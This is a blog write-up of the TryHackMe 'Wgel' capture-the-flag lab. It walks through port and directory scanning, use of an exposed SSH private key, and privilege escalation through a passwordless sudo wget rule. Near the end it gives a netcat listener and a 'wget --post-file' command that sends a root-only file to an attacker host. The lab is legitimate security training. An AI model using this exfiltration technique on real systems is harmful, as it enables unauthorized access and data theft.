<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TryHackMe: Wgel write-up - bughunter.me</title><meta name="description" content="In this article we'll tackle an easy CTF on TryHackMe. We'll enumerate a Linux box, find misplaced credentials and exploit a common Linux tool to&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta name="theme-color" content="#17181E" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#D73A42" media="(prefers-color-scheme: light)"><meta name="msapplication-navbutton-color" content="#D73A42"><meta name="apple-mobile-web-app-status-bar-style" content="#D73A42"><link rel="canonical" href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-wgel-write-up/"><link rel="alternate" type="application/atom+xml" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.xml"><link rel="alternate" type="application/json" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.json"><meta property="og:title" content="TryHackMe: Wgel write-up"><meta property="og:image" content="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/20/Wgel-Banner-jpg.webp"><meta property="og:image:width" content="1400"><meta property="og:image:height" content="1060"><meta property="og:site_name" content="bughunter.me"><meta property="og:description" content="In this article we'll tackle an easy CTF on TryHackMe. We'll enumerate a Linux box, find misplaced credentials and exploit a common Linux tool to&hellip;"><meta property="og:url" content="https://e4ld3rs0n.github.io/bughunter-publii//tryhackme-wgel-write-up/"><meta property="og:type" content="article"><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/redhatmono/redhatmono.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/redhatmono/redhatmono-italic.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/css/style.css?v=7fa218a425dbbcb21ada335c561af1e5"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-wgel-write-up/"},"headline":"TryHackMe: Wgel write-up","datePublished":"2024-02-11T22:46+01:00","dateModified":"2025-01-26T18:11+01:00","image":{"@type":"ImageObject","url":"https://e4ld3rs0n.github.io/bughunter-publii/media/posts/20/Wgel-Banner-jpg.webp","height":1060,"width":1400},"description":"In this article we'll tackle an easy CTF on TryHackMe. We'll enumerate a Linux box, find misplaced credentials and exploit a common Linux tool to&hellip;","author":{"@type":"Person","name":"andrey","url":"https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/"},"publisher":{"@type":"Organization","name":"andrey"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body class="post-template"><div class="container container--center"><header class="header"><div class="header__logo"><a class="logo" href="https://e4ld3rs0n.github.io/bughunter-publii/">bughunter.me</a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/blog/" target="_self">blog</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" target="_self">ctf</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/about-me/" title="About this blog" target="_self">whoami</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">TryHackMe: Wgel write-up</h1><div class="post__meta"><time datetime="2024-02-11T22:46" class="post__date">Sunday, 11 February 2024 </time><span class="post__author"><a href="https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/" class="feed__author">andrey</a></span></div><div class="post__tags"><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" class="invert">ctf</a> <a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/tryhackme/" class="invert">tryhackme</a></div></header><figure class="post__image post__cover"><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/20/Wgel-Banner-jpg.webp" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/20/responsive/Wgel-Banner-jpg-xs.webp 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/20/responsive/Wgel-Banner-jpg-sm.webp 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/20/responsive/Wgel-Banner-jpg-md.webp 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/20/responsive/Wgel-Banner-jpg-lg.webp 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="1060" width="1400" alt=""></figure><div class="post__entry"><p></p><p>In this article we'll tackle an easy CTF on TryHackMe. We'll enumerate a Linux box, find misplaced credentials and exploit a common Linux tool to escalate our privileges and exfiltrate information.</p><p></p><p></p><p>Link: <a href="https://tryhackme.com/room/wgelctf" target="_blank" rel="noopener">https://tryhackme.com/room/wgelctf</a></p><p></p><p></p><p>Difficulty: <code>Easy</code></p><p></p><p></p><p>Authors: <code>MrSeth6797</code></p><p></p><p></p><h2 class="wp-block-heading">First steps and enumeration</h2><p></p><p></p><p>Our journey into this CTF challenge begins with a comprehensive <code>nmap</code> scan to identify active services on the target machine. The scan revealed two open ports: an HTTP server on port 80 and SSH on port 22, indicating potential targets for exploration. The HTTP server is running Apache httpd 2.4.18 on Ubuntu, while the SSH service is OpenSSH 7.2p2 Ubuntu 4ubuntu2.8.:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ nmap -sV -sT -p- -oN nmap/full-scan.nmap $IPStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 15:18 CETNmap scan report for 10.10.222.165Host is up (0.042s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 26.88 seconds</pre><p></p><p></p><p>It looks like the web server hosts the default web page bundled with Apache installation. However a quick GoBuster scan with the <code>directory-list-lowercase-2.3-medium.txt</code> list shows that there is something more than meets the eye:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt | tee gobuster.log===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.222.165[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/sitemap              (Status: 301) [Size: 316] [--&gt; http://10.10.222.165/sitemap/]Progress: 62904 / 207644 (30.29%)</pre><p></p><p></p><p>There's a hidden /sitemap directory. An inspection of the website's source code also revealed a comment potentially hinting at a username:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="html" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;!-- Jessie don’t forget to udate the website. --&gt;</pre><p></p><p></p><p>The detail noted appears to be a potential username, which could be important later on. Next, we visited the <code>/sitemap</code> area of the website.</p><p></p><p></p><p>It's a template from ColorLib, but nothing stood out at first. To dig deeper, I used <code>GoBuster</code> for a directory search. When the initial scan with one wordlist didn't show results, I switched to the DirBuster wordlist for a more thorough search:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ gobuster dir -u http://$IP/sitemap -w /usr/share/wordlists/dirb/common.txt | tee gobuster-sitemap.log ===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.222.165/sitemap[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirb/common.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.hta                 (Status: 403) [Size: 278]/.htaccess            (Status: 403) [Size: 278]/.htpasswd            (Status: 403) [Size: 278]/.ssh                 (Status: 301) [Size: 321] [--&gt; http://10.10.222.165/sitemap/.ssh/]/css                  (Status: 301) [Size: 320] [--&gt; http://10.10.222.165/sitemap/css/]/fonts                (Status: 301) [Size: 322] [--&gt; http://10.10.222.165/sitemap/fonts/]/images               (Status: 301) [Size: 323] [--&gt; http://10.10.222.165/sitemap/images/]/index.html           (Status: 200) [Size: 21080]/js                   (Status: 301) [Size: 319] [--&gt; http://10.10.222.165/sitemap/js/]Progress: 4614 / 4615 (99.98%)===============================================================Finished===============================================================</pre><p></p><p></p><p>There is a very interesting hidden directory called .ssh. If we take a peek inside we find an SSH private key. We can make a handy backup copy of it on our machine and use it with the username <code>jessie</code> to access the target box. Inside Jessie's Documents directory we can finally get the user flag.</p><p></p><p></p><h2 class="wp-block-heading">Privilege escalation</h2><p></p><p></p><p>After gaining access to the system, we proceeded to further enumerate its configuration. A quick check with <code>sudo -l</code> revealed a particularly interesting privilege assigned to the user <code>jessie</code>. The system allows <code>jessie</code> to execute <code>wget</code> as root without the need for a password:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ sudo -lMatching Defaults entries for jessie on CorpOne:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser jessie may run the following commands on CorpOne:    (ALL : ALL) ALL    (root) NOPASSWD: /usr/bin/wget</pre><p></p><p></p><p>Since we can't see what's inside the <code>/root</code> directory, but guessing that the root flag might be called <code>root_flag.txt</code> (just like the user flag was named <code>user_flag.txt</code>), we can use <code>wget</code> to try and grab it.</p><p></p><p></p><p>First, let's set up a listener on our local machine to receive the file. This can be done using <code>netcat</code>:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ nc -vlnp 1337</pre><p></p><p></p><p>Now let's use <code>wget</code> to send the contents of the <code>root_flag.txt</code> file from the target system to our listener:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ sudo wget --post-file=/root/root_flag.txt http://&lt;Attacker IP&gt;:1337</pre><p></p><p></p><p>And just like that, we capture the root flag right in our terminal.</p><p></p></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Sunday, 26 January 2025</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Ftryhackme-wgel-write-up%2F" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Ftryhackme-wgel-write-up%2F" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://api.whatsapp.com/send?text=TryHackMe%3A%20Wgel%20write-up https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Ftryhackme-wgel-write-up%2F" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-inject-write-up/" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  HackTheBox: Inject write-up "><span class="btn__icon">←</span> <span class="btn__text">HackTheBox: Inject write-up</span></a></div></nav></article><div class="post__comments"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="commento"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var commento_element_to_check = document.getElementById('commento');

				if ('IntersectionObserver' in window) {
					var iObserver = new IntersectionObserver(
						(entries, observer) => {
							entries.forEach(entry => {
								if (entry.intersectionRatio >= 0.1) {
									(function () {
										var d = document, s = d.createElement('script');
										s.defer = true;
										s.setAttribute('data-no-fonts','true');
										s.setAttribute('data-page-id','20');
										s.setAttribute('data-hide-deleted','false');
										s.src = 'https://cdn.commento.io/js/commento.js';									
										(d.head || d.body).appendChild(s);
									})();
									observer.unobserve(entry.target);
								}
							});
						},
						{
							threshold: [0, 0.2, 0.5, 1]
						}
					);

					iObserver.observe(commento_element_to_check);
				} else {
					(function () {
						var d = document, s = d.createElement('script');
						s.defer = true;
						s.setAttribute('data-no-fonts','true');
						s.setAttribute('data-page-id','20');
						s.setAttribute('data-hide-deleted','false');
						s.src = 'https://cdn.commento.io/js/commento.js';
						(d.head || d.body).appendChild(s);
					})();
				}</script><script type="text/javascript"></script></div></div></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p>© 2023 - 2025 BugHunter</p></div></div></footer></div><script defer="defer" src="https://e4ld3rs0n.github.io/bughunter-publii/assets/js/scripts.min.js?v=c2232aa7558e9517946129d2a1b8c770"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'overlay',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script>class Rot18Encoder { constructor() { this.rotations = [ { from: 'a', to: 'z', offset: 18 }, { from: 'A', to: 'Z', offset: 18 }, { from: '0', to: '9', offset: 5 } ]; } _rotate(char, from, to, offset) { const charCode = char.charCodeAt(0); const fromCode = from.charCodeAt(0); const toCode = to.charCodeAt(0); const range = toCode - fromCode + 1; if (charCode >= fromCode && charCode <= toCode) { const shiftedCode = ((charCode - fromCode + offset) % range) + fromCode; return String.fromCharCode(shiftedCode); } return char; } encode(text) { let encodedText = ""; for(let char of text){ let rotatedChar = char; for (const rot of this.rotations){ rotatedChar = this._rotate(rotatedChar, rot.from, rot.to, rot.offset); } encodedText += rotatedChar; } return encodedText; } decode(text) { let decodedText = ""; for(let char of text){ let rotatedChar = char; for (const rot of this.rotations){ rotatedChar = this._rotate(rotatedChar, rot.from, rot.to, rot.to.charCodeAt(0) - rot.from.charCodeAt(0) + 1 - rot.offset); } decodedText += rotatedChar; } return decodedText; } } class TextProcessor { constructor(encoder){ this.encoder = encoder; } encode(text){ return this.encoder.encode(text); } decode(text){ return this.encoder.decode(text); } } document.addEventListener('DOMContentLoaded', function() { const rot18 = new Rot18Encoder(); const coder = new TextProcessor(rot18); var obfElements = document.querySelectorAll('.obfuscated-email'); obfElements.forEach(function(elem) { var dataType = elem.getAttribute('data-type'); var encodedEmail = elem.getAttribute('data-email'); var user = elem.getAttribute('data-user'); var domain = elem.getAttribute('data-domain'); var decodedEmail = ''; if (user && domain) { decodedEmail = coder.decode(user) + '@' + coder.decode(domain); } else if (encodedEmail) { const parts = encodedEmail.split('@'); if (parts.length === 2) { decodedEmail = coder.decode(parts[0]) + '@' + coder.decode(parts[1]); } else { decodedEmail = encodedEmail; } } if (dataType === 'mailto') { var originalText = elem.textContent.trim(); var a = document.createElement('a'); a.href = 'mailto:' + decodedEmail; if (elem.classList.length > 0) { a.className = elem.className; } if (originalText === '') { a.textContent = decodedEmail; } else { a.textContent = originalText; } elem.parentNode.replaceChild(a, elem); } else if (dataType === 'text') { var textNode = document.createTextNode(decodedEmail); elem.parentNode.replaceChild(textNode, elem); } }); });</script></body></html>